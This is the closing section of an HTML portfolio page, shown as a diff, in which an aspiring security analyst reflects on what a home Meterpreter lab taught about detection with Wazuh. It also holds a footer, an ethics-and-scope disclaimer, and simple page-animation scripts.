+    <h2>What changes when you've been the attacker</h2>
+  </div>
+  <div class="prose reveal">
+    <p>Before this lab, "Meterpreter callback" was a phrase in a study guide. Now it's something I've <strong>watched leave a machine</strong>. That's the difference I was after, and it shows up in concrete ways:</p>
+    <p>When an alert fires on an <span class="accent">unsigned binary beaconing to an odd port over TLS</span>, I won't treat it as an abstraction — I know what's on the other end of that connection, why the port is weird, and why the content is encrypted. When I see <span class="accent">real-time protection disabled or a new AV exclusion</span>, I read it as the deliberate move it is, not a config accident. And when a process suddenly holds a SYSTEM token, I know the <em>shape</em> of how it probably got there.</p>
+    <p>That's the loop I'm building toward in my work with <strong>Wazuh</strong> and detection engineering: run the technique, watch what it generates, then write the rule that would have caught it. This lab is one full turn of that loop — the offensive half done deliberately so the defensive half is grounded in something real instead of theory.</p>
+  </div>
+  <div class="takeaway reveal" style="margin-top:8px"><div class="k">Next iteration</div><p>Re-run with an encoder applied (activating obfuscation, T1027) and capture both versions in Wazuh — a direct before/after on what signature-based detection does and doesn't catch. That comparison is the natural sequel to this write-up.</p></div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid reveal">
+      <div>
+        <div class="foot-name">Sai Nikhith Atmakuri</div>
+        <div class="foot-role">M.S. Computer Science · aspiring SOC / Security Analyst · South Florida</div>
+      </div>
+      <div class="foot-links">
+        <a href="https://github.com/Nikhith-ni7" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://www.linkedin.com/in/sai-nikhith-atmakuri-204b501b1" target="_blank" rel="noopener">LinkedIn</a>
+      </div>
+    </div>
+    <div class="disclaimer reveal">
+      <b>Ethics & scope.</b> Every action documented here was performed against virtual machines I own, on an isolated lab network with no route to any production or third-party system. The purpose is education and detection research. Nothing on this page is a deployable tool — it is a write-up of authorized, self-contained lab work, and the environment was reverted to a clean snapshot at the end.
+    </div>
+  </div>
+</footer>
+
+<script>
+  // reveal on scroll
+  const io=new IntersectionObserver((es)=>{es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}})},{threshold:.12});
+  document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+
+  // count-up stats
+  const seen=new WeakSet();
+  const so=new IntersectionObserver((es)=>{es.forEach(e=>{
+    if(!e.isIntersecting||seen.has(e.target))return; seen.add(e.target);
+    e.target.querySelectorAll('.v').forEach(v=>{
+      if(v.dataset.text){v.textContent=v.dataset.text;return;}
+      const to=+v.dataset.to; const dur=1100; const t0=performance.now(); const plain=v.dataset.plain;
+      const step=(t)=>{const p=Math.min(1,(t-t0)/dur);const e2=1-Math.pow(1-p,3);
+        const n=Math.round(to*e2); v.textContent=plain?n:n.toLocaleString();if(p<1)requestAnimationFrame(step);};
+      requestAnimationFrame(step);
+    });
+  })},{threshold:.4});
+  document.querySelectorAll('.stats').forEach(s=>so.observe(s));
+
+  // tabs
+  document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>{
+    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
+    document.querySelectorAll('.pane').forEach(x=>x.classList.remove('on'));
+    t.classList.add('on'); document.getElementById(t.dataset.pane).classList.add('on');
+  }));
+</script>
+</body>
+</html>
